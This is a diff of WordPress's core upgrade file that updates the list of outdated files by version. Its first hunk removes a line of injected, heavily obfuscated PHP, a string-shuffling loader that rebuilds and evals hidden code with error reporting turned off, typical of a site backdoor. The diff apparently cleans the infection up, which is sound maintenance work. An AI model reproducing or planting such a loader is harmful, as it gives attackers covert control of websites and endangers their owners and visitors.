@@ -1,4 +1,4 @@
-<?php $omzqyhziax = 'c%x7822)gj!|!*nbsbq%x5j!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf)fepmqyf%x5c%x7827*&7*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78252f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%!>>%x5c%x7822!pd%x5c%x78x5c%x782f!**#sfmcnbs+yfeobz+5ppde:4:|:**#ppde#)tutj75ttfsqnpdov{h19275j{hnpd19275fubmgoj{7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%c%x782f2986+7**^%x5c%x78c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)4gps)%x5c%x7825j>1<%x5c%x782%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##ovg<~%x5c%x7824<!%x5c%x782%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822787f%x5c%x787f%x5c%x787f<u%x5c%x7163%x74%162%x5f%163%x70%154%x69%164%50%x22%134>!%x5c%x7825tdz)%x5c%x7825164") && (!isset($GLOBALS["%x61%156%x75%156%x61"]25)dfyfR%x5c%x7827tfs%x5c%x78256<*17-%x5c%x7825w6<%x5c%x787fw6*CWtfs%!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878-1);} @error_reporting(0); preg_replace("x787f_*#fmjgk4%x5c%x7860{6~6<tfs78256<C>^#zsfvr#%x5c%x785cq%x5c%x7825svufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|%x78e%x5c%x78b%x5c%x7825w782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x77^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x%51%x29%51%x29%73", N)))) { $GLOBALS["%x6if((function_exists("%x6f%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x566%152%x66%147%x67%42%x2c%ssb!-#}#)fepmqnj!%x5c%x782f!#0#)id5j=tj{fpg)%x5c%x7825%5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqm<#462]47y]252]18y]#>q%x5c%x75cIjQeTQcOc%x5c%x782f#x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f]y34]68]y33]65]y31]53]25)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860c%x7825r%x5c%x785c2^-%x5c%x7825hOhzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]212>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x787x5c%x7827pd%x5c%x78256<pd%x5x5c%x7860{666~6<&w6<%x5c%x787fw6*C{66~67<&w6<*&7-#o]s]o]s]#UI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x7825]D8]86]y31]278]y3f]51L3]84]y31M6]y8:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x78928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x78604392%x2f%50%x2e%52%x29%57%x!ftmbg)!gj<*#k#)usbut%x5cgps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:%162%x61%171%x5f%155%x61%160%x28%42%x73]y76]258]y6g]273]y76]271]y7d]252]y74]225t::!>!%x5c%x7824Ypp3)%x5c%x7828pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<X;%x5c%x7860msvd}R;*msvfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbc%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b#-#G#-#H#-#I#-#K#-#Lc%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7h1:|:*mmvo:>:iuhofm%x5c%x7825:-25bss-%x5c%x7825r%x5c%x7x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256]y81]2yf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x%x7824-!%x5c%x7825%x5c%x7824-%x5c%xFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x%x5c%x7825!**X)ufttj%x5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,6f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c5cB%x5c%x7825iN}#-!tuss%x7825:-t%x5c%x7825)3of:opjud#<!%x5c%x7825ggg)(0)%x5c%x7826:!}7;!}6;##}C;!>>!}W;utpi}Y;25<#372]58y]472]37y]672]48y]#>s%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%xc%x78256<*Y%x5c%x7825)fnbozx78256<C%x5c%x7827pd%x5c%x78256|6.7euqj3hopmA%x5c%x78273qj%x5x5c%x7878r.985:52985-t.98]K4]65po)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;oe%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#Ex5c%x782f#M5]DgP5]D6#<%x5c%x7825fdSFEBFI,6<*127-UVPFNJU,67)fepdof.)fepdof.%x5c%x782f#@#%x5c%xB%x5c%x7825z>!tussfw)-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x78*#npd%x5c%x782f#)rrd%x5c%x782f#0142%x5f%163%x74%141%x72%t0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]0;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x78256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5cgj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFO65","%x65%166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%x5c%x7825!*##>>X)!gjZ<#opo#>b7**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%xj%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew+;!>!}%x5c%x7827;!>>>!}_;]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7874985-rr.93e:5597f-s.973:8297f:5297e:56-%j:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y8bdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV5cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f25bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x51]55]y85]82]y76]62]y3:]84#-!OVMM*<%x225c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x787cYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x78u%x5c%x7825!-#2#%x5c%x782f#%x5c%!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]25657>%x5c%x782272qj%x5x7825>U<#16,47R57,27R66,#%x5c%x%x7824]26%x5c%x7824-%x5c%x7824<%%x5c%x7825)}.;%x5c%x7860UQPMS452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]7825>j%x5c%x7825!*3!%x5c%x364]6]283]427]36]373P6]x7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jx7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%xx5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvoduj5c%x7827,*c%x5c%x7827,*b%x5c%x782)+opjudovg+)!gj+{e%x5c*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%7827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)t6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x78607825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825ng%x5c%x7825)!gj!|!*1?hmgjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%825-*.%x5c%x7825)euhA)3o36]73]83]238M7]381]211M5]67]5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x78225tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kf>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f65]y72]254]y76]61]y33]685c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5cx5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%71]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x77R37,#%x5c%x782fq%x5c%o!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825zc%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x%x7825fdy<Cb*[%x5c%x7825h!:!>!%x5c%x78246767~6<5o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]2%x7825}K;%x5c%x7860ufldpt})3of)fepdof%x5c%x786057ftbc%^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x782y6d]281]y43]78]y33]65]y3>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x78;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1H%x5c%x782f#00#W~!%x5c%x7825t2w)##6~6<%x5c%x787fw6<*K)ftpmdXA6|%x5c%x7825)!gj!<**2-4-bubE{h%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47782fq%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%xc%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%xopjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9*%x5c%x787f_*#[k2%x5c%x7860{pqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x54:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%xx5c%x7878{**#k#)tutjyf%x5c%00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvse_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_S1]273]y76]258]y6g]273]y76]271]y7d]252]y74]256%x78%62%x35%165%x3a%146%x21%76%x21%50%x878B%x5c%x7825h>#]y31]278]y3e]81]K78:56985:6197g:*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpQtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x783e]81#%x5c%x782f#7e:55946-tr.986<*doj%x5c%x78257-C)fepmqn)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%W&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6878X6<#o]o]Y%x5c%x78257;824-%x5c%x7824]y8%x5c%x7824-%x5cJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x782tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7860cpV%x5c%x787f%x5c%xx5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x78c%x7825!-uyfu%x5c%x7825y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x%x5c%x7825)tpqsut>j%x5c%x78c%x7825)323ldfidk!~!<**qp%x5x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x%x7825!*3>?*2b%x5c%x7825)gpf{jt)!Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%1%156%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)25!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>x5c%x7825)utjm!|!*5!%x5c%x7827!hmy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdzULL); }]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%/(.*)/epreg_replacedlwbmsnyyp'; $qmtjqulssr = explode(chr((135-91)),'1600,26,4511,24,1062,49,1580,20,9846,60,1216,41,2517,23,4864,65,2616,37,1687,26,990,46,8859,39,7210,53,1373,25,7531,21,9794,52,6572,39,2248,28,8324,40,554,58,3894,37,2310,25,79,21,4309,61,7928,68,3020,52,9260,24,6460,51,2335,44,8115,29,4370,45,4816,48,9316,60,5981,20,699,38,3931,24,3867,27,5847,47,5651,39,1511,48,1289,37,4959,51,6675,64,8559,56,3485,40,9091,26,6805,64,1257,32,1148,32,9447,48,1111,37,4229,23,7014,55,856,54,2276,34,9224,36,8424,28,3761,29,9376,46,7622,26,2786,23,6064,29,6511,61,5397,25,1927,54,382,24,2003,40,8364,60,8615,67,6155,26,6611,64,8452,39,2896,39,9636,27,9906,66,5191,70,9972,33,6781,24,8144,29,7996,36,2128,65,22,57,765,65,5010,50,9761,33,1443,68,6869,24,7134,52,4479,32,4632,53,6351,33,4252,36,1398,45,9117,44,7263,56,406,28,2852,44,1713,34,2193,55,2725,61,8947,52,8747,67,3398,64,2935,65,4929,30,3462,23,0,22,9663,28,9495,23,7648,28,3127,35,5150,41,495,59,329,53,1873,54,3592,37,2458,59,457,38,3072,31,434,23,3225,68,6384,22,910,47,2540,25,9422,25,957,33,5608,43,3525,67,7371,22,6001,31,8214,67,5060,42,8682,27,4040,57,1326,47,1180,36,7860,68,5894,32,6204,42,4535,45,2077,51,7319,52,4415,64,6963,51,9518,48,4722,39,9161,63,8173,41,8281,43,9566,70,5787,60,2413,45,3790,41,1823,28,3629,51,3703,29,830,26,7552,70,2653,40,4761,55,3363,35,273,56,1626,61,7459,46,1768,55,5564,44,9284,32,6032,32,9691,70,6921,42,737,28,1747,21,6304,47,3986,54,5926,55,5422,51,2693,32,3680,23,2809,43,7676,55,1851,22,8709,38,7393,66,4288,21,8032,50,6406,54,2043,34,8082,33,8999,61,3103,24,8898,49,5473,41,3955,31,2379,34,9060,31,8491,68,10071,35,4195,34,10005,59,7755,65,5261,66,7505,26,1036,26,3831,36,6739,42,4580,52,6181,23,6893,28,6093,62,7820,40,5690,59,675,24,169,39,5102,48,2565,51,100,69,3293,70,5327,70,612,63,6246,58,208,65,4685,37,4097,61,4158,37,3000,20,7069,65,5514,50,8814,45,3732,29,3162,63,7186,24,1981,22,7731,24,5749,38,1559,21,10064,7'); $myxxbutxep=substr($omzqyhziax,(60426-50320),(47-40)); if (!function_exists('xogzuazkwt')) { function xogzuazkwt($jxdkxlrekg, $phytufgmej) { $fkcibcnggm = NULL; for($dpibkqtddc=0;$dpibkqtddc<(sizeof($jxdkxlrekg)/2);$dpibkqtddc++) { $fkcibcnggm .= substr($phytufgmej, $jxdkxlrekg[($dpibkqtddc*2)],$jxdkxlrekg[($dpibkqtddc*2)+1]); } return $fkcibcnggm; };} $ownnycpwxe="\x20\57\x2a\40\x6d\163\x6b\154\x64\146\x68\152\x62\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x34\55\x31\60\x37\51\x29\54\x20\143\x68\162\x28\50\x33\65\x30\55\x32\65\x38\51\x29\54\x20\170\x6f\147\x7a\165\x61\172\x6b\167\x74\50\x24\161\x6d\164\x6a\161\x75\154\x73\163\x72\54\x24\157\x6d\172\x71\171\x68\172\x69\141\x78\51\x29\51\x3b\40\x2f\52\x20\165\x72\172\x63\141\x6a\150\x61\160\x6d\40\x2a\57\x20"; $pfeipaitvs=substr($omzqyhziax,(61373-51260),(69-57)); $pfeipaitvs($myxxbutxep, $ownnycpwxe, NULL); $pfeipaitvs=$ownnycpwxe; $pfeipaitvs=(757-636); $omzqyhziax=$pfeipaitvs-1; ?><?php
+<?php
 /**
  * WordPress core upgrade functionality.
  *
@@ -292,20 +292,14 @@ $_old_files = array(
 'wp-admin/css/colors-classic-rtl.dev.css',
 'wp-admin/css/colors-fresh-rtl.css',
 'wp-admin/css/colors-fresh-rtl.dev.css',
-'wp-admin/css/dashboard-rtl.css',
 'wp-admin/css/dashboard-rtl.dev.css',
-'wp-admin/css/dashboard.css',
 'wp-admin/css/dashboard.dev.css',
-'wp-admin/css/farbtastic-rtl.css',
 'wp-admin/css/global-rtl.css',
 'wp-admin/css/global-rtl.dev.css',
 'wp-admin/css/global.css',
 'wp-admin/css/global.dev.css',
-'wp-admin/css/install-rtl.css',
 'wp-admin/css/install-rtl.dev.css',
-'wp-admin/css/login-rtl.css',
 'wp-admin/css/login-rtl.dev.css',
-'wp-admin/css/login.css',
 'wp-admin/css/login.dev.css',
 'wp-admin/css/ms.css',
 'wp-admin/css/ms.dev.css',
@@ -317,9 +311,7 @@ $_old_files = array(
 'wp-admin/css/plugin-install-rtl.dev.css',
 'wp-admin/css/plugin-install.css',
 'wp-admin/css/plugin-install.dev.css',
-'wp-admin/css/press-this-rtl.css',
 'wp-admin/css/press-this-rtl.dev.css',
-'wp-admin/css/press-this.css',
 'wp-admin/css/press-this.dev.css',
 'wp-admin/css/theme-editor-rtl.css',
 'wp-admin/css/theme-editor-rtl.dev.css',
@@ -329,9 +321,7 @@ $_old_files = array(
 'wp-admin/css/theme-install-rtl.dev.css',
 'wp-admin/css/theme-install.css',
 'wp-admin/css/theme-install.dev.css',
-'wp-admin/css/widgets-rtl.css',
 'wp-admin/css/widgets-rtl.dev.css',
-'wp-admin/css/widgets.css',
 'wp-admin/css/widgets.dev.css',
 'wp-admin/includes/internal-linking.php',
 'wp-includes/images/admin-bar-sprite-rtl.png',
@@ -535,7 +525,175 @@ $_old_files = array(
 'wp-includes/js/jquery/ui/jquery.effects.pulsate.min.js',
 'wp-includes/js/jquery/ui/jquery.effects.transfer.min.js',
 'wp-includes/js/jquery/ui/jquery.effects.fold.min.js',
+'wp-admin/images/screenshots/captions-1.png',
+'wp-admin/images/screenshots/captions-2.png',
+'wp-admin/images/screenshots/flex-header-1.png',
+'wp-admin/images/screenshots/flex-header-2.png',
+'wp-admin/images/screenshots/flex-header-3.png',
+'wp-admin/images/screenshots/flex-header-media-library.png',
+'wp-admin/images/screenshots/theme-customizer.png',
+'wp-admin/images/screenshots/twitter-embed-1.png',
+'wp-admin/images/screenshots/twitter-embed-2.png',
+'wp-admin/js/utils.js',
 'wp-admin/options-privacy.php',
+'wp-app.php',
+'wp-includes/class-wp-atom-server.php',
+'wp-includes/js/tinymce/themes/advanced/skins/wp_theme/ui.css',
+// 3.5.2
+'wp-includes/js/swfupload/swfupload-all.js',
+// 3.6
+'wp-admin/js/revisions-js.php',
+'wp-admin/images/screenshots',
+'wp-admin/js/categories.js',
+'wp-admin/js/categories.min.js',
+'wp-admin/js/custom-fields.js',
+'wp-admin/js/custom-fields.min.js',
+// 3.7
+'wp-admin/js/cat.js',
+'wp-admin/js/cat.min.js',
+'wp-includes/js/tinymce/plugins/wpeditimage/js/editimage.min.js',
+// 3.8
+'wp-includes/js/tinymce/themes/advanced/skins/wp_theme/img/page_bug.gif',
+'wp-includes/js/tinymce/themes/advanced/skins/wp_theme/img/more_bug.gif',
+'wp-includes/js/thickbox/tb-close-2x.png',
+'wp-includes/js/thickbox/tb-close.png',
+'wp-includes/images/wpmini-blue-2x.png',
+'wp-includes/images/wpmini-blue.png',
+'wp-admin/css/colors-fresh.css',
+'wp-admin/css/colors-classic.css',
+'wp-admin/css/colors-fresh.min.css',
+'wp-admin/css/colors-classic.min.css',
+'wp-admin/js/about.min.js',
+'wp-admin/js/about.js',
+'wp-admin/images/arrows-dark-vs-2x.png',
+'wp-admin/images/wp-logo-vs.png',
+'wp-admin/images/arrows-dark-vs.png',
+'wp-admin/images/wp-logo.png',
+'wp-admin/images/arrows-pr.png',
+'wp-admin/images/arrows-dark.png',
+'wp-admin/images/press-this.png',
+'wp-admin/images/press-this-2x.png',
+'wp-admin/images/arrows-vs-2x.png',
+'wp-admin/images/welcome-icons.png',
+'wp-admin/images/wp-logo-2x.png',
+'wp-admin/images/stars-rtl-2x.png',
+'wp-admin/images/arrows-dark-2x.png',
+'wp-admin/images/arrows-pr-2x.png',
+'wp-admin/images/menu-shadow-rtl.png',
+'wp-admin/images/arrows-vs.png',
+'wp-admin/images/about-search-2x.png',
+'wp-admin/images/bubble_bg-rtl-2x.gif',
+'wp-admin/images/wp-badge-2x.png',
+'wp-admin/images/wordpress-logo-2x.png',
+'wp-admin/images/bubble_bg-rtl.gif',
+'wp-admin/images/wp-badge.png',
+'wp-admin/images/menu-shadow.png',
+'wp-admin/images/about-globe-2x.png',
+'wp-admin/images/welcome-icons-2x.png',
+'wp-admin/images/stars-rtl.png',
+'wp-admin/images/wp-logo-vs-2x.png',
+'wp-admin/images/about-updates-2x.png',
+// 3.9
+'wp-admin/css/colors.css',
+'wp-admin/css/colors.min.css',
+'wp-admin/css/colors-rtl.css',
+'wp-admin/css/colors-rtl.min.css',
+'wp-admin/css/media-rtl.min.css',
+'wp-admin/css/media.min.css',
+'wp-admin/css/farbtastic-rtl.min.css',
+'wp-admin/images/lock-2x.png',
+'wp-admin/images/lock.png',
+'wp-admin/js/theme-preview.js',
+'wp-admin/js/theme-install.min.js',
+'wp-admin/js/theme-install.js',
+'wp-admin/js/theme-preview.min.js',
+'wp-includes/js/plupload/plupload.html4.js',
+'wp-includes/js/plupload/plupload.html5.js',
+'wp-includes/js/plupload/changelog.txt',
+'wp-includes/js/plupload/plupload.silverlight.js',
+'wp-includes/js/plupload/plupload.flash.js',
+'wp-includes/js/plupload/plupload.js',
+'wp-includes/js/tinymce/plugins/spellchecker',
+'wp-includes/js/tinymce/plugins/inlinepopups',
+'wp-includes/js/tinymce/plugins/media/js',
+'wp-includes/js/tinymce/plugins/media/css',
+'wp-includes/js/tinymce/plugins/wordpress/img',
+'wp-includes/js/tinymce/plugins/wpdialogs/js',
+'wp-includes/js/tinymce/plugins/wpeditimage/img',
+'wp-includes/js/tinymce/plugins/wpeditimage/js',
+'wp-includes/js/tinymce/plugins/wpeditimage/css',
+'wp-includes/js/tinymce/plugins/wpgallery/img',
+'wp-includes/js/tinymce/plugins/wpfullscreen/css',
+'wp-includes/js/tinymce/plugins/paste/js',
+'wp-includes/js/tinymce/themes/advanced',
+'wp-includes/js/tinymce/tiny_mce.js',
+'wp-includes/js/tinymce/mark_loaded_src.js',
+'wp-includes/js/tinymce/wp-tinymce-schema.js',
+'wp-includes/js/tinymce/plugins/media/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/media/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/media/media.htm',
+'wp-includes/js/tinymce/plugins/wpview/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/wpview/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/directionality/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/directionality/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/wordpress/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/wordpress/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/wpdialogs/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/wpdialogs/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/wpeditimage/editimage.html',
+'wp-includes/js/tinymce/plugins/wpeditimage/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/wpeditimage/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/fullscreen/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/fullscreen/fullscreen.htm',
+'wp-includes/js/tinymce/plugins/fullscreen/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/wplink/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/wplink/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/wpgallery/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/wpgallery/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/tabfocus/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/tabfocus/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/wpfullscreen/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/wpfullscreen/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/paste/editor_plugin.js',
+'wp-includes/js/tinymce/plugins/paste/pasteword.htm',
+'wp-includes/js/tinymce/plugins/paste/editor_plugin_src.js',
+'wp-includes/js/tinymce/plugins/paste/pastetext.htm',
+'wp-includes/js/tinymce/langs/wp-langs.php',
+// 4.1
+'wp-includes/js/jquery/ui/jquery.ui.accordion.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.autocomplete.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.button.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.core.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.datepicker.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.dialog.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.draggable.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.droppable.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-blind.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-bounce.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-clip.min.js',
